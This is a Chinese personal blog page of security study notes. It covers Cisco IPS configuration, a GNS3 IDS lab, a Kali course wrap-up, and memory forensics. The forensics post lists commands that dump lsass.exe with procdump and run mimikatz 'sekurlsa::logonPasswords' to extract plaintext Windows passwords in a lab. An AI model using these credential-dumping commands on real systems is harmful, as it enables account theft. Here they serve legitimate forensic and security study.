<h4 id="1-常用的网络安全设备"><a href="#1-常用的网络安全设备" class="headerlink" title="1. 常用的网络安全设备"></a>1. 常用的网络安全设备</h4><ul>
<li>防火墙</li>
<li>VPN（虚拟专用网络）</li>
<li>IDS和IPS</li>
<li>杀毒软件</li>
<li>UTM（威胁管理）</li>
</ul>
<h4 id="2-IPS-gt-Sensor-Setup"><a href="#2-IPS-gt-Sensor-Setup" class="headerlink" title="2. IPS -&gt; Sensor Setup"></a>2. IPS -&gt; Sensor Setup</h4><ul>
<li>Network<ul>
<li>Allow Password Recovery：这个选项默认是开启的。用于如果忘记IPS的登陆密码。可以在IPS启机过程当中使用密码恢复功能。把IPS的密码恢复成默认的cisco.注意。这个恢复。不会影响到IPS的一些相关配置。IPS默认是不开启telnet功能的。可以通过这个面板开启。</li>
<li>LOGIN Banner：用于在登陆IPS的时候，弹出相关告警。</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Network.png" alt="IME--IPS--Network"></p>
<p>![IME–IPS–Login Banner](/images/ips/ips-notepad/IME–IPS–Login Banner.png)</p>
<ul>
<li>Allowed Host/Networks：用于限制哪个台设备，或者哪个网段。可以网管这台IPS。</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Permit.png" alt="IME--IPS--Permit"></p>
<ul>
<li>Time</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Time.png" alt="IME--IPS--Time"></p>
<ul>
<li>Authentication：用于管理IPS用户帐号密码，并为某个帐号授权相应权限</li>
<li>权限等级<ul>
<li>Administrator：管理员权限。对于IPS管理和配置来说。是最高权限。可以对IPS的基本网络，网络管理，接口管理，策略管理，日志读取进行配置</li>
<li>Operator：操作者权限。可以对于IPS的策略，日志读取进行配置</li>
<li>Viewer：查看者权限。紧紧只能对IPS的日志进行读取</li>
<li>Service：IPS底层权限。IPS底层修改时使用（通过Console口连接）</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Authentication.png" alt="IME--IPS--Authentication"></p>
<h4 id="3-IPS出入流量策略"><a href="#3-IPS出入流量策略" class="headerlink" title="3. IPS出入流量策略"></a>3. IPS出入流量策略</h4><ul>
<li><p>Outbound流量</p>
<ul>
<li>IPS对于这种流量不做任何限制。也就是说。只要是路由存在的情况下。并且在IPS去往某个目的IP的过程中，没有策略拒绝这股流量的话。IPS可以抵达网络中任何一个IP主机。</li>
<li>▲ IPS进行这种通信的时候。使用的是管理接口（M口）</li>
</ul>
</li>
<li><p>Inbound流量允许</p>
<ul>
<li>已建立连接的流量（对IPS的一个回程报文，始发者是IPS）</li>
<li>源自于NTP服务器的数据包</li>
<li>Allowed Host所放行的流量。Allowed Host类似于ACL应用在VTY链路。添加条目的时候，可以针对一个主机或者一个子网</li>
</ul>
</li>
</ul>
<h4 id="4-IPS-gt-Interface"><a href="#4-IPS-gt-Interface" class="headerlink" title="4. IPS -&gt; Interface"></a>4. IPS -&gt; Interface</h4><ul>
<li>Bypass<ul>
<li>用于修改</li>
<li>三种模式<ul>
<li>AUTO：自动模式。当IPS检测引擎发生故障的时候，对于流量的监控，自动关闭。直接放行流量（默认形式）</li>
<li>ON：开启旁路模式。IPS对流量的监控直接关闭。对任何来到IPS的流量都不做检测匹配，直接放行</li>
<li>OFF：关闭旁路模式。IPS对于流量的监控是必须的。如果发生检测引擎发送故障，而IPS又使用了这个模式，那么就会对网络造成一定的影响</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Bypass.png" alt="IME--IPS--Bypass"></p>
<h4 id="5-IPS-gt-Policies"><a href="#5-IPS-gt-Policies" class="headerlink" title="5. IPS -&gt; Policies"></a>5. IPS -&gt; Policies</h4><ul>
<li>Signatures：签名。攻击特征码。IPS匹配攻击流量的关键配置。对于网络中，形形色色各种流量。都是通过Sig去配置匹配指定的一些特殊流量</li>
<li>可以针对某一条sig进行配置：<br>动作，匹配参数，enable状态，退休状态。针对某条sig.进行克隆，编辑。删除。导出。等等一系列配置</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Sig%E7%89%B9%E5%BE%81%E7%A0%81.png" alt="IME--IPS--Sig特征码"></p>
<ul>
<li>VS：虚拟传感器。可以理解为一个虚拟的IPS。一个VS内，独立关联一个接口。独立的Sig攻击库，独立的规则，独立策略。多个VS之间，关联不同的接口。使用不同的策略。针对不同流量，实现不同的动作。VS之间相互不影响（从IPS软件版本6.X开始）<ul>
<li>描述</li>
<li>关联相关的接口</li>
<li>关联相关的SIG攻击库</li>
<li>关联相关的规则</li>
<li>▲ 可以使用一个策略配置在不同的VS里面。唯独！接口不能够重复配置在其他的VS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--VS1.png" alt="IME--IPS--VS1"></p>
<ul>
<li>Edit Actions：编辑针对某个Sig被触发后所执行的动作<ul>
<li>告警和日志行为<ul>
<li>Produce Alert–产生告警</li>
<li>Produce Verbose Alert–产生冗长告警。把触发这个Sig的数据抓包，并附在告警里</li>
<li>Log Attacker Packets–Log攻击者。对触发这条Sig的数据报文的源IP地址，在后面的一定时间内（可修改）。对其进行抓包，停止后，可以通过IDM下载这个抓包文件。使用抓包攻击打开，进行数据的分析 —-单一攻击源</li>
<li>Log Victim Packets–Log受害者。对触发这条Sig的数据报文的目的IP地址，在后面的一定时间内（可修改）对其进行抓包。停止后 —-多攻击源</li>
<li>Log Pair Packets–Log pair。对触发这条Sig的数据报文的指定的源和目的地址IP地址，在后面的一定时间内（可修改）。对其进行抓包。停止后，可以通过IDM下载这个抓包文件。使用抓包工具打开，进行数据的分析</li>
<li>Request SNMP Trap–SNMP Trap。需要指定SNMP服务器。把触发这条Sig的告警上传到指定服务器</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>![IME–IPS–Edit Actions](/images/ips/ips-notepad/IME–IPS–Edit Actions.png)</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/09/IPS%E7%AC%94%E8%AE%B0-5%EF%BC%9AIME--IPS%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/09/IPS%E7%AC%94%E8%AE%B0-5%EF%BC%9AIME--IPS%E5%AE%9E%E9%AA%8C/" itemprop="url">IPS笔记-5：IME--IPS实验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-09T22:56:39+08:00">
                2020-03-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  465 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-IDS模拟实验"><a href="#1-IDS模拟实验" class="headerlink" title="1. IDS模拟实验"></a>1. IDS模拟实验</h4><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：以太网交换机</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240开启的主机连接"></p>
<p><img src="/images/ips/ips-notepad/IPS%E5%9C%A8%E7%BA%BF%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IPS在线模式报警拓扑图"></p>
<h4 id="2-IDS：IPS-4240"><a href="#2-IDS：IPS-4240" class="headerlink" title="2. IDS：IPS-4240"></a>2. IDS：IPS-4240</h4><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet2</li>
</ul>
<h4 id="3-R1和R2"><a href="#3-R1和R2" class="headerlink" title="3. R1和R2"></a>3. R1和R2</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h4 id="4-SW：Ethernet-switch"><a href="#4-SW：Ethernet-switch" class="headerlink" title="4. SW：Ethernet switch"></a>4. SW：Ethernet switch</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h4 id="5-测试连通性"><a href="#5-测试连通性" class="headerlink" title="5. 测试连通性"></a>5. 测试连通性</h4><ul>
<li>R1(f 1/0)-&gt; SW(1)</li>
<li>R2(f 1/0)-&gt; SW(2)</li>
<li>IDS -&gt; SW(3)</li>
<li>IDS -&gt; SW(4)</li>
</ul>
<h4 id="6-拓扑配置"><a href="#6-拓扑配置" class="headerlink" title="6. 拓扑配置"></a>6. 拓扑配置</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME中配置接口对（mypair）<ul>
<li>Configuration -&gt; Interface Pairs -&gt; Add -&gt; 选取一对接口 -&gt; 开启</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AEmypair.png" alt="IME--IPS配置mypair"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; mypair</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPS绑定病毒特征识别库Sig0"></p>
<ul>
<li><p>划分VLAN</p>
<ul>
<li>SW<ul>
<li>端口1、3属于VLAN2</li>
<li>端口2、4属于VLAN3</li>
</ul>
</li>
</ul>
</li>
<li><p>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</p>
</li>
</ul>
<h4 id="7-入侵检测"><a href="#7-入侵检测" class="headerlink" title="7. 入侵检测"></a>7. 入侵检测</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IPS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IPS监控IPS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS%E4%BA%8B%E4%BB%B6.png" alt="IME--IPS监控IPS事件"> </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/Kali%20Linux%E7%AC%94%E8%AE%B0--%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/05/Kali%20Linux%E7%AC%94%E8%AE%B0--%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E/" itemprop="url">Kali Linux笔记--写在最后</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-05T09:33:53+08:00">
                2020-03-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  496 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><h2 id="安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程"><a href="#安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程" class="headerlink" title="安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程"></a>安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程</h2><ul>
<li>课程内容<ul>
<li>Kali安装与实验环境搭建  -&gt;  √ </li>
<li>基本攻击  -&gt;  √</li>
<li>信息收集  -&gt;  √</li>
<li>主动信息收集  -&gt;  √</li>
<li>弱点扫描  -&gt;  √</li>
<li>缓冲区溢出  -&gt;  √</li>
<li>提权  -&gt;  √</li>
<li>无线攻击  -&gt;  X</li>
<li>Web安全  -&gt;  √</li>
<li>密码破解  -&gt;  √</li>
<li>流量操控与隧道技术  -&gt;  √</li>
<li>拒绝服务  -&gt;  √</li>
<li>免杀  -&gt;  √</li>
<li>Metasploit Framework  -&gt;  √</li>
<li>取证  -&gt;  √</li>
</ul>
</li>
<li>▲ 无线安全独立于其他模块，而且对于其他部分内容影响几乎没有，所有暂无学，在不久的将来，若有涉及到，会再翻回来继续学习，聆听苑老师的课，开启1.5倍加速，哈哈哈哈哈….</li>
</ul>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><h3 id="从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持-是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。"><a href="#从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持-是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。" class="headerlink" title="从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持,是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。"></a>从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢<a href="https://fengwenhua.top/" target="_blank" rel="noopener">文华大佬</a>提供的帮助和支持,是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。</h3><h3 id="107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？"><a href="#107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？" class="headerlink" title="107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？"></a>107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？</h3><h3 id="最后，借用文华大佬的一句话，慢慢来，不急不急…"><a href="#最后，借用文华大佬的一句话，慢慢来，不急不急…" class="headerlink" title="最后，借用文华大佬的一句话，慢慢来，不急不急…."></a>最后，借用文华大佬的一句话，慢慢来，不急不急….</h3>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/" itemprop="url">Kali Linux笔记(一百一十七)：活取证和死取证</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T23:45:00+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-活取证"><a href="#1-活取证" class="headerlink" title="1. 活取证"></a>1. 活取证</h4><ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>从内存还原文字<ul>
<li>procdump：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a> <ul>
<li>存在Linux版本，GitHub链接：<a href="https://github.com/Microsoft/ProcDump-for-Linux" target="_blank" rel="noopener">https://github.com/Microsoft/ProcDump-for-Linux</a></li>
</ul>
</li>
<li>strings：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings</a></li>
<li><strong><code>🔺命令：procdump -ma notepad.exe notepad.dmp</code></strong>（记事本的进程）</li>
<li><strong><code>🔺命令：strings notepad.dmp &gt; notepad.txt</code></strong>（只识别连续三个以上的ASCII码字符）</li>
<li>其他文字处理程序也适用</li>
</ul>
</li>
<li>从内存还原图片<ul>
<li>远程桌面、画图工具、Virtualbox虚拟机（dump取虚拟机window XP SP3的图像）</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 memdump -p 1456 -D test</code></strong> </li>
<li><strong><code>🔺命令：mv mstsc.dmp mstsc.data</code></strong></li>
<li>Gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</li>
</ul>
</li>
<li>从内存中提取明文密码<ul>
<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
<li><strong><code>🔺命令：Mimikatz</code></strong> </li>
<li><strong><code>🔺命令：sekurlsa::minidump lsass.dmp</code></strong> </li>
<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong> </li>
</ul>
</li>
<li>Volatility的mimikatz插件<ul>
<li><a href="https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py" target="_blank" rel="noopener">https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</a></li>
</ul>
</li>
<li>Firefox浏览器审计工具<ul>
<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --All</code></strong></li>
</ul>
</li>
</ul>
<h4 id="2-实验–从内存还原文字"><a href="#2-实验–从内存还原文字" class="headerlink" title="2. 实验–从内存还原文字"></a>2. 实验–从内存还原文字</h4><ul>
<li>Window XP SP3<ul>
<li>拷贝procdump到window XP SP3上</li>
<li>找一段文字写入notepad中，<strong><code>🔺命令：netstat -nao</code></strong>查看进程是否有notepad.exe</li>
<li><strong><code>🔺命令：procdump.exe -ma notepad.exe notepad.dmp</code></strong></li>
<li><strong><code>🔺命令：strings.exe notepad.dmp &gt; notepad.txt</code></strong></li>
<li>对比两个文件的内容，是否存在相同（搜索特征字符）</li>
</ul>
</li>
</ul>
<h4 id="3-实验–从内存还原图片"><a href="#3-实验–从内存还原图片" class="headerlink" title="3. 实验–从内存还原图片"></a>3. 实验–从内存还原图片</h4><ul>
<li>▲ 图片不同于图像，图像在软件中保存后，可以导出为图片</li>
<li>Window XP SP3<ul>
<li>截图工具 → 随意截取一张图片 → 保存图片到桌面 → 用画图工具打开</li>
<li><strong><code>🔺命令：cmd → tasklist</code></strong><ul>
<li>在Window XP SP3上暂不能执行此命令</li>
</ul>
</li>
<li><strong><code>🔺命令：procdump.exe -ma mspaint.exe mspaint.dmp</code></strong></li>
<li>Win+R → mstsc → 远程连接一个机器</li>
<li><strong><code>🔺命令：cmd → tasklist</code></strong></li>
<li><strong><code>🔺命令：procdump.exe -ma mstsc.exe mstsc.dmp</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>从共享文件中拷贝mspaint.dmp和mstsc.dmp文件</li>
<li><strong><code>🔺命令：apt-get install gimp</code></strong></li>
<li>打开gimp</li>
<li><strong><code>🔺命令：mv mspaint.dump mspaint.data</code></strong></li>
<li><strong><code>🔺命令：mv mstsc.dump mstsc.data</code></strong></li>
<li>gimp打开mstsc.data/mspaint.data</li>
<li>调整Offset、Width、Height（高度一般不起作用，宽度一般其决定作用）</li>
<li>▲ 2020.03.04 gimp通过滑块去移动会导致软件崩溃，只能通过值输入</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/gimp%E6%89%93%E5%BC%80%E5%86%85%E5%AD%98%E5%9B%BE%E7%89%87.png" alt="gimp打开内存图片"></p>
<h4 id="4-实验–从内存提取明文密码"><a href="#4-实验–从内存提取明文密码" class="headerlink" title="4. 实验–从内存提取明文密码"></a>4. 实验–从内存提取明文密码</h4><ul>
<li>Window XP SP3<ul>
<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：cd /usr/share/mimikatz</code></strong></li>
<li>压缩mimikatz x86为一个x86.zip文件</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>拷贝.x86到window XP SP3的机子上</li>
<li>双击mimikatz打开</li>
<li><strong><code>🔺命令：sekurlsa::</code></strong></li>
<li><strong><code>🔺命令：sekurlsa::minidump lsa.dmp</code></strong></li>
<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong></li>
<li>查看dump下来的身份信息</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=cc53U-yoem8lUfoxmFbu2wXynjsFjLnBwEC3Si4GrjvAMVZi0GehgaJnJJSuvMt_a-86ajRPPkZdq5V6hdfOsLik7IbdzMRDgcpHfelW-f6eQWU0YlWGthKivPxBASWwcl_CdYKKhurBl9LH0eE&file_name=/logonPasswords%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF.png" alt="logonPasswords的身份信息"></p>
<h4 id="5-实验–Volatility的mimikatz插件"><a href="#5-实验–Volatility的mimikatz插件" class="headerlink" title="5. 实验–Volatility的mimikatz插件"></a>5. 实验–Volatility的mimikatz插件</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 Github的链接失效，暂无法找到mimikatz.py，此模块未实验</li>
<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
